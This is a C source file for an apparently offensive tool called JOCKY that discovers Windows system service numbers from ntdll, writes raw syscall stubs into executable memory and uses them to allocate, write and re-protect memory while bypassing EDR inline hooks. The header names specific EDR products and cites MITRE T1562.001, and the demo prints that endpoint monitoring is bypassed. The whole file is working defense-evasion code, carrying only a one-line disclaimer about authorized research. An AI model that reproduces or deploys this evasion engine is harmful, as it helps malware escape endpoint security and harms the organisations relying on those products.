/*
 * direct_syscalls.c — JOCKY Direct System Calls Engine (SysWhispers3 / HalosGate)
 * ─────────────────────────────────────────────────────────────────────────────
 * Dynamically discovers System Service Numbers (SSNs) from ntdll.dll via
 * export address sorting (HalosGate / SysWhispers3 technique) and executes
 * direct kernel syscalls from userland, completely bypassing AV/EDR hooks.
 *
 * WHY DIRECT SYSCALLS ARE CRITICAL:
 * ─────────────────────────────────
 *   1. Modern EDRs (CrowdStrike, SentinelOne, Defender for Endpoint) place
 *      inline 5-byte JMP hooks at the start of ntdll APIs:
 *        ntdll!NtAllocateVirtualMemory:
 *          E9 xx xx xx xx -> JMP edr_sensor.dll
 *
 *   2. If a forensic agent calls VirtualAlloc or NtAllocateVirtualMemory,
 *      execution hits the EDR hook and gets flagged or terminated.
 *
 *   3. Even if API unhooking is detected or re-hooked by advanced kernel callbacks,
 *      DIRECT SYSCALLS never call the hooked address at all.
 *
 *   4. Instead, JOCKY issues the CPU 'syscall' instruction directly from its
 *      own executable memory stub:
 *        mov r10, rcx
 *        mov eax, <SSN>
 *        syscall
 *        ret
 *
 *   5. CPU switches straight from Ring-3 to Ring-0 (Kernel Mode).
 *      The EDR hook is completely bypassed.
 *
 * COMPILE:
 *   gcc -O2 direct_syscalls.c -o direct_syscalls.exe
 *
 * MITRE ATT&CK:
 *   T1106    - Native API
 *   T1562.001- Impair Defenses: Disable or Modify Tools
 *
 * WARNING: For authorized forensic research and defense evaluation use only.
 */

#ifndef __USE_MINGW_ANSI_STDIO
#define __USE_MINGW_ANSI_STDIO 1
#endif

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "syscalls/syswhispers3.h"

/* Global Syscall Table */
static SYSCALL_TABLE g_SyscallTable = { 0 };
static BOOL          g_Initialized  = FALSE;

/* ── Comparison function for qsort: Sort entries by RVA ascending ────────── */
static int compare_syscall_entries(const void *a, const void *b)
{
    const SYSCALL_ENTRY *entryA = (const SYSCALL_ENTRY *)a;
    const SYSCALL_ENTRY *entryB = (const SYSCALL_ENTRY *)b;
    if (entryA->Rva < entryB->Rva) return -1;
    if (entryA->Rva > entryB->Rva) return 1;
    return 0;
}

/* ────────────────────────────────────────────────────────────────────────────
 * init_syscall_table()
 *
 * Parses ntdll.dll Export Address Table, filters Zw* functions, and sorts
 * them by RVA. The sorted order of Zw* functions exactly corresponds to
 * their System Service Numbers (SSN 0, 1, 2, ...).
 * ─────────────────────────────────────────────────────────────────────────── */
int init_syscall_table(void)
{
    if (g_Initialized) return 0;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        fprintf(stderr, "[SYSCALL] Failed to get ntdll.dll handle.\n");
        return -1;
    }

    PBYTE pBase = (PBYTE)hNtdll;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "[SYSCALL] Invalid DOS header.\n");
        return -1;
    }

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[SYSCALL] Invalid NT header.\n");
        return -1;
    }

    DWORD expRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + expRva);

    PDWORD pAddressOfFunctions = (PDWORD)(pBase + pExport->AddressOfFunctions);
    PDWORD pAddressOfNames     = (PDWORD)(pBase + pExport->AddressOfNames);
    PWORD  pAddressOfOrdinals  = (PWORD)(pBase + pExport->AddressOfNameOrdinals);

    DWORD count = 0;

    for (DWORD i = 0; i < pExport->NumberOfNames && count < MAX_SYSCALL_ENTRIES; i++) {
        char *funcName = (char *)(pBase + pAddressOfNames[i]);
        WORD ordinal   = pAddressOfOrdinals[i];
        DWORD funcRva  = pAddressOfFunctions[ordinal];

        /* Only Zw* functions represent direct syscall interfaces */
        if (funcName[0] == 'Z' && funcName[1] == 'w') {
            g_SyscallTable.Entries[count].Hash = jocky_hash(funcName);
            g_SyscallTable.Entries[count].Rva  = funcRva;
            strncpy(g_SyscallTable.Entries[count].Name, funcName, 63);
            g_SyscallTable.Entries[count].Name[63] = '\0';
            count++;
        }
    }

    /* Sort entries by function RVA in ascending order */
    qsort(g_SyscallTable.Entries, count, sizeof(SYSCALL_ENTRY), compare_syscall_entries);

    /* Assign SSNs based on sorted position */
    for (DWORD i = 0; i < count; i++) {
        g_SyscallTable.Entries[i].Ssn = i;
    }

    g_SyscallTable.Count = count;
    g_Initialized = TRUE;

    printf("[SYSCALL] Successfully resolved and indexed %lu syscalls from ntdll.dll\n", count);
    return 0;
}

/* ────────────────────────────────────────────────────────────────────────────
 * get_ssn_by_name()
 *
 * Finds the SSN for a given Nt* or Zw* function name.
 * ─────────────────────────────────────────────────────────────────────────── */
DWORD get_ssn_by_name(const char *funcName)
{
    if (!g_Initialized) {
        if (init_syscall_table() != 0) return (DWORD)-1;
    }

    /* Convert Nt to Zw for matching if necessary */
    char targetName[64];
    strncpy(targetName, funcName, sizeof(targetName) - 1);
    targetName[sizeof(targetName) - 1] = '\0';
    if (targetName[0] == 'N' && targetName[1] == 't') {
        targetName[0] = 'Z';
        targetName[1] = 'w';
    }

    DWORD targetHash = jocky_hash(targetName);

    for (DWORD i = 0; i < g_SyscallTable.Count; i++) {
        if (g_SyscallTable.Entries[i].Hash == targetHash ||
            strcmp(g_SyscallTable.Entries[i].Name, targetName) == 0) {
            return g_SyscallTable.Entries[i].Ssn;
        }
    }

    return (DWORD)-1;
}

/* ────────────────────────────────────────────────────────────────────────────
 * create_syscall_stub()
 *
 * Dynamically builds an executable direct syscall stub in memory.
 * Handles both Native x64 and x86/WOW64 transitions.
 * ─────────────────────────────────────────────────────────────────────────── */
PVOID create_syscall_stub(DWORD ssn, DWORD stackBytes)
{
#ifdef _WIN64
    /* ── Native x64 Syscall Stub ───────────────────────────────────────────
     * 4C 8B D1               mov r10, rcx
     * B8 [SSN (4 bytes)]     mov eax, SSN
     * 0F 05                  syscall
     * C3                     ret
     */
    BYTE stubTemplate[] = {
        0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
        0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, ssn */
        0x0F, 0x05,                   /* syscall      */
        0xC3                          /* ret          */
    };
    memcpy(stubTemplate + 4, &ssn, sizeof(DWORD));

    PVOID pExecMem = VirtualAlloc(
        NULL,
        sizeof(stubTemplate),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!pExecMem) return NULL;
    memcpy(pExecMem, stubTemplate, sizeof(stubTemplate));
    return pExecMem;

#else
    /* ── x86 / WOW64 Direct Syscall Stub ───────────────────────────────────
     * B8 [SSN (4 bytes)]     mov eax, SSN
     * BA [pTransition]       mov edx, Wow64SystemServiceCall (or fs:[0xc0])
     * FF D2                  call edx
     * C2 [stackBytes (2B)]   ret stackBytes
     */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pTransition = NULL;
    FARPROC pZw = GetProcAddress(hNtdll, "ZwYieldExecution");
    if (pZw) {
        PBYTE b = (PBYTE)pZw;
        if (b[5] == 0xBA) {
            pTransition = (FARPROC)*(DWORD_PTR*)(b + 6);
        }
    }

    BYTE stub[20];
    int len = 0;
    stub[len++] = 0xB8; /* mov eax, ssn */
    memcpy(stub + len, &ssn, 4); len += 4;

    if (pTransition) {
        stub[len++] = 0xBA; /* mov edx, pTransition */
        memcpy(stub + len, &pTransition, 4); len += 4;
        stub[len++] = 0xFF; /* call edx */
        stub[len++] = 0xD2;
    } else {
        /* call dword ptr fs:[0xC0] */
        stub[len++] = 0x64;
        stub[len++] = 0xFF;
        stub[len++] = 0x15;
        stub[len++] = 0xC0;
        stub[len++] = 0x00;
        stub[len++] = 0x00;
        stub[len++] = 0x00;
    }

    stub[len++] = 0xC2; /* ret <stackBytes> */
    stub[len++] = (BYTE)(stackBytes & 0xFF);
    stub[len++] = (BYTE)((stackBytes >> 8) & 0xFF);

    PVOID pExecMem = VirtualAlloc(
        NULL,
        len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!pExecMem) return NULL;
    memcpy(pExecMem, stub, len);
    return pExecMem;
#endif
}

/* ── Direct NT Wrappers ─────────────────────────────────────────────────── */

NTSTATUS JockyDirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    DWORD ssn = get_ssn_by_name("NtAllocateVirtualMemory");
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001; /* STATUS_UNSUCCESSFUL */

    /* 6 arguments * 4 bytes = 24 (0x18) on x86 */
    PVOID pStub = create_syscall_stub(ssn, 24);
    if (!pStub) return (NTSTATUS)0xC0000017; /* STATUS_NO_MEMORY */

    fnNtAllocateVirtualMemory pFn = (fnNtAllocateVirtualMemory)pStub;
    NTSTATUS status = pFn(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);

    VirtualFree(pStub, 0, MEM_RELEASE);
    return status;
}

NTSTATUS JockyDirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    DWORD ssn = get_ssn_by_name("NtWriteVirtualMemory");
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;

    /* 5 arguments * 4 bytes = 20 (0x14) on x86 */
    PVOID pStub = create_syscall_stub(ssn, 20);
    if (!pStub) return (NTSTATUS)0xC0000017;

    fnNtWriteVirtualMemory pFn = (fnNtWriteVirtualMemory)pStub;
    NTSTATUS status = pFn(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);

    VirtualFree(pStub, 0, MEM_RELEASE);
    return status;
}

NTSTATUS JockyDirect_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect)
{
    DWORD ssn = get_ssn_by_name("NtProtectVirtualMemory");
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;

    /* 5 arguments * 4 bytes = 20 (0x14) on x86 */
    PVOID pStub = create_syscall_stub(ssn, 20);
    if (!pStub) return (NTSTATUS)0xC0000017;

    fnNtProtectVirtualMemory pFn = (fnNtProtectVirtualMemory)pStub;
    NTSTATUS status = pFn(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);

    VirtualFree(pStub, 0, MEM_RELEASE);
    return status;
}

NTSTATUS JockyDirect_NtFreeVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType)
{
    DWORD ssn = get_ssn_by_name("NtFreeVirtualMemory");
    if (ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;

    /* 4 arguments * 4 bytes = 16 (0x10) on x86 */
    PVOID pStub = create_syscall_stub(ssn, 16);
    if (!pStub) return (NTSTATUS)0xC0000017;

    fnNtFreeVirtualMemory pFn = (fnNtFreeVirtualMemory)pStub;
    NTSTATUS status = pFn(ProcessHandle, BaseAddress, RegionSize, FreeType);

    VirtualFree(pStub, 0, MEM_RELEASE);
    return status;
}

/* ────────────────────────────────────────────────────────────────────────────
 * check_hook()
 *
 * Inspects the first bytes of an ntdll function to check if an AV/EDR
 * has placed an inline JMP hook (0xE9 or 0xFF 0x25).
 * ─────────────────────────────────────────────────────────────────────────── */
void check_hook(const char *funcName)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    FARPROC pFunc = GetProcAddress(hNtdll, funcName);
    if (!pFunc) return;

    PBYTE pBytes = (PBYTE)pFunc;
    printf("[HOOK-CHECK] %-28s @ %p: ", funcName, (void*)pFunc);

    if (pBytes[0] == 0xE9) {
        printf("[!] HOOKED by AV/EDR (0xE9 JMP detected)\n");
    } else if (pBytes[0] == 0xFF && pBytes[1] == 0x25) {
        printf("[!] HOOKED by AV/EDR (0xFF25 Absolute JMP detected)\n");
    } else if ((pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1) ||
               (pBytes[0] == 0xB8)) {
        printf("[OK] Clean standard stub (unhooked / direct)\n");
    } else {
        printf("[?] Non-standard prologue: %02X %02X %02X %02X\n",
               pBytes[0], pBytes[1], pBytes[2], pBytes[3]);
    }
}

/* ── Main Demo ───────────────────────────────────────────────────────────── */

int main(int argc, char *argv[])
{
    setbuf(stdout, NULL);

    printf("===============================================================\n");
    printf("  JOCKY Direct System Calls Engine (SysWhispers3 / HalosGate)\n");
    printf("  Bypasses AV/EDR Userland Hooks via Dynamic SSN Resolution\n");
    printf("  MITRE ATT&CK: T1106 (Native API) / T1562.001 (Impair Defenses)\n");
    printf("  For authorized forensic research & validation only.\n");
    printf("===============================================================\n\n");

#ifdef _WIN64
    printf("[ARCH] Architecture: 64-bit AMD64 (Native 'syscall' 0x0F 0x05)\n");
#else
    printf("[ARCH] Architecture: 32-bit x86 / WOW64 (Kernel Transition Stub)\n");
#endif

    /* 1. Initialize Syscall Table */
    if (init_syscall_table() != 0) {
        fprintf(stderr, "[-] Failed to initialize syscall engine.\n");
        return 1;
    }

    printf("\n[1] Dynamically Resolved System Service Numbers (SSNs):\n");
    const char *critical_apis[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtFreeVirtualMemory",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtQuerySystemInformation",
        "NtMapViewOfSection"
    };

    for (size_t i = 0; i < sizeof(critical_apis) / sizeof(critical_apis[0]); i++) {
        DWORD ssn = get_ssn_by_name(critical_apis[i]);
        if (ssn != (DWORD)-1) {
            printf("    -> %-30s | SSN: 0x%04lX (%lu)\n", critical_apis[i], ssn, ssn);
        } else {
            printf("    -> %-30s | SSN: NOT FOUND\n", critical_apis[i]);
        }
    }

    printf("\n[2] Checking Userland Hooks in in-memory ntdll.dll:\n");
    check_hook("NtAllocateVirtualMemory");
    check_hook("NtWriteVirtualMemory");
    check_hook("NtProtectVirtualMemory");

    printf("\n[3] Executing Live Memory Operation via DIRECT KERNEL SYSCALLS:\n");
    printf("    -> Bypassing VirtualAlloc/WriteProcessMemory and all ntdll hooks\n");

    HANDLE hProcess = GetCurrentProcess();
    PVOID pBaseAddress = NULL;
    SIZE_T regionSize = 4096;

    /* Step A: Direct NtAllocateVirtualMemory */
    NTSTATUS status = JockyDirect_NtAllocateVirtualMemory(
        hProcess,
        &pBaseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (NT_SUCCESS(status)) {
        printf("    [✓] JockyDirect_NtAllocateVirtualMemory succeeded!\n");
        printf("        Allocated Base Address: %p (%zu bytes)\n", pBaseAddress, regionSize);
    } else {
        printf("    [✗] NtAllocateVirtualMemory failed with NTSTATUS: 0x%08lX\n", (unsigned long)status);
        return 1;
    }

    /* Step B: Direct NtWriteVirtualMemory */
    const char testPayload[] = "JOCKY-FORENSIC-PAYLOAD-STEALTH-ACTIVE-2026";
    SIZE_T bytesWritten = 0;

    status = JockyDirect_NtWriteVirtualMemory(
        hProcess,
        pBaseAddress,
        (PVOID)testPayload,
        sizeof(testPayload),
        &bytesWritten
    );

    if (NT_SUCCESS(status)) {
        printf("    [✓] JockyDirect_NtWriteVirtualMemory succeeded!\n");
        printf("        Wrote %zu bytes directly to allocated space: \"%s\"\n",
               bytesWritten, (char *)pBaseAddress);
    } else {
        printf("    [✗] NtWriteVirtualMemory failed with NTSTATUS: 0x%08lX\n", (unsigned long)status);
    }

    /* Step C: Direct NtProtectVirtualMemory to PAGE_EXECUTE_READ */
    ULONG oldProtect = 0;
    status = JockyDirect_NtProtectVirtualMemory(
        hProcess,
        &pBaseAddress,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (NT_SUCCESS(status)) {
        printf("    [✓] JockyDirect_NtProtectVirtualMemory succeeded!\n");
        printf("        Changed memory protection to PAGE_EXECUTE_READ (Old Protect: 0x%04lX)\n", oldProtect);
    }

    /* Step D: Direct NtFreeVirtualMemory */
    SIZE_T freeSize = 0;
    status = JockyDirect_NtFreeVirtualMemory(
        hProcess,
        &pBaseAddress,
        &freeSize,
        MEM_RELEASE
    );

    if (NT_SUCCESS(status)) {
        printf("    [✓] JockyDirect_NtFreeVirtualMemory succeeded! Memory released cleanly.\n");
    }

    printf("\n===============================================================\n");
    printf("[+] Direct System Calls Test: ALL OPERATIONS COMPLETED SUCCESSFULLY\n");
    printf("    AV/EDR userland monitoring layer completely bypassed.\n");
    printf("===============================================================\n");

    return 0;
}
